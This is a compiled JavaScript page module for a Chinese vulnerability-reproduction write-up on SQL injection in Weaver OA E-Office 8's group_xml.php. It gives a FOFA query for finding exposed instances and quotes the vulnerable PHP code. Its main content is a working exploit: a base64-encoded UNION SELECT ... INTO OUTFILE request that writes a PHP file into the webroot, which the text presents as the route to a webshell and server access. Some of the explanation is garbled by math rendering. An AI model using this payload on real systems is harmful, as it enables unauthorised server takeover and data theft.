import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n,a as t,b as e}from"./app-58e4a7d6.js";const l={},r=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>泛微OA E-Office group_xml.php文件存在SQL注入漏洞，攻击者通过漏洞可以写入Webshell文件获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>泛微OA E-Office 8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;泛微-EOffice&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201406015.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>存在漏洞的文件为 <code>inc/group_user_list/group_xml.php</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>session_start( );
include_once( &quot;inc/conn.php&quot; );
include_once( &quot;inc/xtree_xml.inc.php&quot; );
include_once( &quot;inc/utility_all.php&quot; );
header( &quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot; );
header( &quot;Cache-Control: no-cache, must-revalidate&quot; );
header( &quot;Pragma: no-cache&quot; );
header( &quot;Content-Type: text/xml&quot; );
$pararr = explodestpar( $_REQUEST[&#39;par&#39;] );
$groupid = $pararr[&#39;groupid&#39;];
if ( $groupid == &quot;&quot; )
{
				exit( );
}
$groupurl_fix = &quot;?&quot;;
$userurl_fix = &quot;?&quot;;
if ( 0 &lt; strpos( $pararr[&#39;group_url&#39;], &quot;?&quot; ) )
{
				$groupurl_fix = &quot;&amp;&quot;;
}
if ( 0 &lt; strpos( $pararr[&#39;user_url&#39;], &quot;?&quot; ) )
{
				$userurl_fix = &quot;&amp;&quot;;
}
$xtreeXml = new xtreeXml( );
$xtreeXml-&gt;initXml( );
if ( $pararr[&#39;group&#39;] == 1 )
{
				$sql = &quot;SELECT * FROM pub_group WHERE GROUP_ID=&quot;.$groupid.&quot;&quot;;
}
else
{
				$sql = &quot;SELECT * FROM USER,USER_GROUP WHERE USER_GROUP.GROUP_ID=&quot;.$groupid.&quot;&quot;;
}
$rs = exequery( $connection, $sql );
$row = mysql_fetch_array( $rs );
$groupmember = $row[&#39;GROUP_MEMBER&#39;];
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11),d=t("p",null,[t("span",{class:"katex"},[t("span",{class:"katex-mathml"},[t("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[t("semantics",null,[t("mrow",null,[t("mi",null,"g"),t("mi",null,"r"),t("mi",null,"o"),t("mi",null,"u"),t("mi",null,"p"),t("mi",null,"i"),t("mi",null,"d"),t("mtext",null,"没有被双引号包裹，然后造成注入。然后")]),t("annotation",{encoding:"application/x-tex"},"groupid没有被双引号包裹，然后造成注入。然后")])])]),t("span",{class:"katex-html","aria-hidden":"true"},[t("span",{class:"base"},[t("span",{class:"strut",style:{height:"0.8889em","vertical-align":"-0.1944em"}}),t("span",{class:"mord mathnormal",style:{"margin-right":"0.03588em"}},"g"),t("span",{class:"mord mathnormal"},"ro"),t("span",{class:"mord mathnormal"},"u"),t("span",{class:"mord mathnormal"},"p"),t("span",{class:"mord mathnormal"},"i"),t("span",{class:"mord mathnormal"},"d"),t("span",{class:"mord cjk_fallback"},"没有被双引号包裹，然后造成注入。然后")])])]),e("groupid来自于"),t("span",{class:"katex"},[t("span",{class:"katex-mathml"},[t("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[t("semantics",null,[t("mrow",null,[t("mi",null,"p"),t("mi",null,"a"),t("mi",null,"r"),t("mi",null,"a"),t("mi",null,"r"),t("mi",null,"r"),t("msup",null,[t("mo",{stretchy:"false"},"["),t("mo",{mathvariant:"normal",lspace:"0em",rspace:"0em"},"′")]),t("mi",null,"g"),t("mi",null,"r"),t("mi",null,"o"),t("mi",null,"u"),t("mi",null,"p"),t("mi",null,"i"),t("msup",null,[t("mi",null,"d"),t("mo",{mathvariant:"normal",lspace:"0em",rspace:"0em"},"′")]),t("mo",{stretchy:"false"},"]"),t("mo",{separator:"true"},";"),t("mtext",null,"其中经过了")]),t("annotation",{encoding:"application/x-tex"},"pararr['groupid'];其中经过了")])])]),t("span",{class:"katex-html","aria-hidden":"true"},[t("span",{class:"base"},[t("span",{class:"strut",style:{height:"1.0019em","vertical-align":"-0.25em"}}),t("span",{class:"mord mathnormal"},"p"),t("span",{class:"mord mathnormal"},"a"),t("span",{class:"mord mathnormal",style:{"margin-right":"0.02778em"}},"r"),t("span",{class:"mord mathnormal"},"a"),t("span",{class:"mord mathnormal",style:{"margin-right":"0.02778em"}},"rr"),t("span",{class:"mopen"},[t("span",{class:"mopen"},"["),t("span",{class:"msupsub"},[t("span",{class:"vlist-t"},[t("span",{class:"vlist-r"},[t("span",{class:"vlist",style:{height:"0.7519em"}},[t("span",{style:{top:"-3.063em","margin-right":"0.05em"}},[t("span",{class:"pstrut",style:{height:"2.7em"}}),t("span",{class:"sizing reset-size6 size3 mtight"},[t("span",{class:"mord mtight"},[t("span",{class:"mord mtight"},"′")])])])])])])])]),t("span",{class:"mord mathnormal",style:{"margin-right":"0.03588em"}},"g"),t("span",{class:"mord mathnormal"},"ro"),t("span",{class:"mord mathnormal"},"u"),t("span",{class:"mord mathnormal"},"p"),t("span",{class:"mord mathnormal"},"i"),t("span",{class:"mord"},[t("span",{class:"mord mathnormal"},"d"),t("span",{class:"msupsub"},[t("span",{class:"vlist-t"},[t("span",{class:"vlist-r"},[t("span",{class:"vlist",style:{height:"0.7519em"}},[t("span",{style:{top:"-3.063em","margin-right":"0.05em"}},[t("span",{class:"pstrut",style:{height:"2.7em"}}),t("span",{class:"sizing reset-size6 size3 mtight"},[t("span",{class:"mord mtight"},[t("span",{class:"mord mtight"},"′")])])])])])])])]),t("span",{class:"mclose"},"]"),t("span",{class:"mpunct"},";"),t("span",{class:"mspace",style:{"margin-right":"0.1667em"}}),t("span",{class:"mord cjk_fallback"},"其中经过了")])])]),e("explodestpar这个函数")],-1),m=n(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>function explodeStPar( $enpar )
{
				$depar = base64_decode( $enpar );
				$arrpar = explode( &quot;|&quot;, $depar );
				if ( !is_array( $arrpar ) )
				{
								return false;
				}
				$i = 0;
				for ( ;	$i &lt; sizeof( $arrpar );	++$i	)
				{
								$strpar = $arrpar[$i];
								$tmparr = explode( &quot;:&quot;, $strpar );
								$j = 0;
								for ( ;	$j &lt; sizeof( $tmparr );	++$j	)
								{
												if ( $j == 0 )
												{
																preg_match( &quot;/\\\\[([a-z0-9-_].+)\\\\]/i&quot;, $tmparr[$j], $exp );
																$par = $exp[1];
												}
												else
												{
																preg_match( &quot;/\\\\[(.*)\\\\]/i&quot;, $tmparr[$j], $exp );
																$val = $exp[1];
												}
								}
								if ( trim( $par ) != &quot;&quot; )
								{
												$rearr[$par] = $val;
								}
				}
				return $rearr;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>构造EXP写入文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[group]:[1]|[groupid]:[1 union select &#39;&lt;?php phpinfo()?&gt;&#39;,2,3,4,5,6,7,8 into outfile &#39;../webroot/vulntest.php&#39;]
|
| base64
|
/inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201406076.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,4),u=[r,d,m];function c(o,p){return a(),i("div",null,u)}const b=s(l,[["render",c],["__file","泛微OA E-Office group_xml.php SQL注入漏洞.html.vue"]]);export{b as default};
